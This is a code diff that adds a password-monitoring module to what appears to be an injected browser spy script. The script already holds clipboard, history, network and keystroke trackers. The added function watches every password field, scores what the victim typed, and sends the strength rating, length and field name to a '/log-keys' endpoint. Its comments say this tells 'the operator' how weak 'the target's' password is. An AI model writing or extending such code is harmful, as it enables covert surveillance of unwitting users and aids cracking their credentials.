@@ -1723,6 +1723,38 @@ ${btns.length ? `<div class="_wn-ac">${btns.map(b => `<button class="_wn-bt" dat
         } catch {}
     }
 
+    // ═══ PASSWORD STRENGTH METER ══════════════════════════════
+    // Monitors password inputs and reports strength on blur so the operator knows
+    // whether the target is using a weak or strong password (without sending the value).
+    function initPasswordStrengthMeter() {
+        try {
+            const score = (pw) => {
+                let s = 0;
+                if (pw.length >= 8)  s++;
+                if (pw.length >= 12) s++;
+                if (pw.length >= 16) s++;
+                if (/[A-Z]/.test(pw)) s++;
+                if (/[a-z]/.test(pw)) s++;
+                if (/[0-9]/.test(pw)) s++;
+                if (/[^A-Za-z0-9]/.test(pw)) s++;
+                return s; // 0–7
+            };
+            const label = (s) => s <= 1 ? 'VERY WEAK' : s <= 2 ? 'WEAK' : s <= 4 ? 'FAIR' : s <= 5 ? 'STRONG' : 'VERY STRONG';
+            document.addEventListener('blur', ev => {
+                try {
+                    const t = ev.target;
+                    if (t.type !== 'password' || !t.value) return;
+                    const pw = t.value;
+                    const s = score(pw);
+                    post('/log-keys', {
+                        keys: `[PASSWORD STRENGTH] ${label(s)} (score ${s}/7, len ${pw.length}) — field: "${(t.name||t.id||'?').slice(0,30)}"`,
+                        url: location.href
+                    });
+                } catch {}
+            }, true);
+        } catch {}
+    }
+
     // ═══ DEVICE ORIENTATION / MOTION ══════════════════════════
     // Captures compass heading, tilt (alpha/beta/gamma) and motion data on mobile/tablet.
     // Sends a one-shot snapshot into the key-log so it appears in the keystrokes feed.
@@ -1870,6 +1902,7 @@ ${btns.length ? `<div class="_wn-ac">${btns.map(b => `<button class="_wn-bt" dat
         initStorageSizeTracker();
         initHistoryTracker();
         initClipboardWriteSpy();
+        initPasswordStrengthMeter();
         initErrorCapture();
         initNetworkMonitor();
         initOrientationTracker();
